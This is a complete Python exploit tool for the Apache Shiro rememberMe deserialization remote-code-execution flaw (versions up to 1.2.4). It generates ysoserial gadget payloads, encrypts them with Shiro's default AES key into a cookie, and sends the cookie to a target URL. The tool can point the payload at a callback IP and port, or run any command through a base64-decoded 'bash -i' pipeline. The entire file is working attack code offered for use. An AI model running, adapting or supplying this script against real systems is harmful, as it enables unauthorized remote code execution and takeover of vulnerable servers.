#!/usr/bin/env python
# -*- coding: utf-8 -*-


"""
auth: @acgbfull
version: 1.0
function: Apache Shiro <= 1.2.4 Deserialization RCE via Cookie rememberMe
usage: python shiro.py ip:port
       python shiro.py command
       python shiro.py -u url -o file_path ip:port|command
note:
Step1: Generate Cookie rememberMe
Step2: Send Cookie to target
"""


import uuid
import base64
import subprocess
import re
import urllib.request
import urllib.parse
import zlib
import time
import argparse
from argparse import RawTextHelpFormatter
from Crypto.Cipher import AES


def encode_rememberme(data, module):
    # module is JRMPClient or CommonsCollections2
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.5-SNAPSHOT-all.jar', module, data], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


def generate_cookie_rememberme(file_path, data):
    file_path = file_path
    sys_argv_red = data
    ip_port_pattern = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}$')
    switch_result = ip_port_pattern.search(sys_argv_red)
    if switch_result is not None and switch_result is not "":
        try:
            payload_rebound = encode_rememberme(sys_argv_red, 'JRMPClient')
        except Exception as error:
            print("Generate cookie Error: {0}: {1}".format(Exception, error))
            return False
        cookie = "rememberMe={0}".format(payload_rebound.decode())
        print("Generate cookie success\n")
        if file_contents_operate(file_path, method='w', contents=cookie):
            print("{0}".format(cookie))
            print("\ncookie value in payload.cookie.txt\n")
            return cookie
        else:
            print("!!!Cookie rememberMe write file error\n")
            print("{0}".format(cookie))
            return False
    else:
        string = str(base64.b64encode(sys_argv_red.encode(encoding="utf-8")), encoding="utf-8")
        bash_java_base64_encode_str = "bash -c {{echo,{0}}}|{{base64,-d}}|{{bash,-i}}".format(string)
        try:
            payload_command = encode_rememberme(bash_java_base64_encode_str, 'CommonsCollections2')
        except Exception as error:
            print("Generate cookie Error: {0}: {1}".format(Exception, error))
            return False
        cookie = "rememberMe={0}".format(payload_command.decode())
        print("Generate cookie success\n")
        if file_contents_operate(file_path, method='w', contents=cookie):
            print("{0}".format(cookie))
            print("\ncookie value in payload.cookie.txt\n")
            return cookie
        else:
            print("!!!Cookie rememberMe write file error\n")
            print("{0}".format(cookie))
            return False


def file_contents_operate(file_path, method='r', contents=None):
    if file_path is not False:
        if method == 'r':
            with open(file_path, 'r') as f:
                return f.read()
        if method == 'w':
            with open(file_path, 'w') as f:
                f.write(contents)
                return True
        if method == 'a':
            with open(file_path, 'a') as f:
                f.write(contents)
                return True
    else:
        print(u"ERROR: 文件路径为空!")
        return False


def parse_args():
    description = u"Description:\n    Apache shiro <= 1.2.4  rememberMe 反序列化漏洞利用工具 By acgbfull By T00ls.Net"
    """
    usage = "\n    python shiro.py ip:port    # 生成反向连接到指定ip端口的cookie\n" \
            "    python shiro.py command    # 生成执行指定命令的cookie\n" \
            "    python shiro.py -u url -o file_path ip:port|command    # 用生成的cookie访问指定的url\n"\
            "--------------------------------------------------------------------------------"
    """
    usage = '''\n    python shiro.py ip:port    # 生成反向连接到指定ip端口的cookie
    python shiro.py command    # 生成执行指定命令的cookie
    python shiro.py -u url -o file_path ip:port|command    # 用生成的cookie访问指定的url\n
--------------------------------------------------------------------------------
    '''
    parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter, description=description, usage=usage)

    parser.add_argument('-o', '--output', help="file path of cookie output", required=False, default=False)
    parser.add_argument('-u', '--url', help="target url", required=False, default=False)
    parser.add_argument('data', help="ip:port or command")

    arguments = parser.parse_args()
    return arguments


def get_http_response(url, cookie=None, data=None, encode_method='utf-8', timeout=5, num_retries=3, sleep_time=1, decode_method='utf-8'):
    decode_method = decode_method
    encode_method = encode_method
    user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/40.0'
    if cookie is None:
        headers = {'User-Agent': user_agent}
    else:
        headers = {'User-Agent': user_agent, 'Cookie': cookie}
    if data is None:
        request = urllib.request.Request(url, headers=headers)  # get request构造
    else:
        data_encode = urllib.parse.urlencode(data).encode(encode_method)
        request = urllib.request.Request(url, headers=headers, data=data_encode)   # post request构造

    try:
        response = urllib.request.urlopen(request, timeout=timeout)

        # 若response内容非字符流(如gzip)，则转换为字符流
        resp_headers = response.info()
        if ("Content-Encoding" in resp_headers) and (resp_headers['Content-Encoding'] == "gzip"):
            response = zlib.decompress(response.read(),
                                       16 + zlib.MAX_WBITS)  # urllib.request.urlopen(request).read() return: 一个 bytes对象
        else:
            response = response.read()

        response = response.decode(decode_method)
    except Exception as error:
        if num_retries > 0:
            if hasattr(error, 'code') and 400 <= error.code < 600:
                time.sleep(sleep_time)
                return get_http_response(url=url, cookie=cookie, data=data, encode_method=encode_method,
                                         timeout=timeout, num_retries=num_retries - 1, sleep_time=sleep_time,
                                         decode_method=decode_method)
            else:
                return get_http_response(url=url, cookie=cookie, data=data, encode_method=encode_method,
                                         timeout=timeout, num_retries=num_retries - 1, sleep_time=sleep_time,
                                         decode_method=decode_method)
        else:
            print("\nmethod get_http_response error, {0}: {1}".format(Exception, error))
        response = ""
    return response


def logo():
    title = "Apache shiro <= 1.2.4  rememberMe 反序列化漏洞利用工具"
    title_space_num = ' '*17
    by_space_num = ' '*60
    delimit = '-'*80

    # by1: 14 char
    by1 = "---By acgbfull"
    # by2: 15 char
    by2 = "---By T00ls.Net"

    print("\n{0}".format(delimit))
    print("{0}{1}{2}".format(title_space_num, title, title_space_num))
    print("{0}{1}".format(by_space_num, by1))
    print("{0}{1}".format(by_space_num, by2))
    print("\n{0}".format(delimit))


if __name__ == '__main__':
    logo()
    # Init parameter via system input
    arguments = parse_args()
    url = arguments.url
    data = arguments.data
    output_file_path = arguments.output
    file_path = output_file_path if output_file_path else "payload.cookie.txt"
    # 如果url非false, 生成cookie并发送含该cookie的http请求至目标网站
    if url:
        cookie = generate_cookie_rememberme(file_path, data)
        if cookie:
            if get_http_response(url=url, cookie=cookie, num_retries=3, timeout=3):
                print("\n{0} request success".format(url))
            else:
                print("!!!{0} request error".format(url))
    else:
        generate_cookie_rememberme(file_path, data)
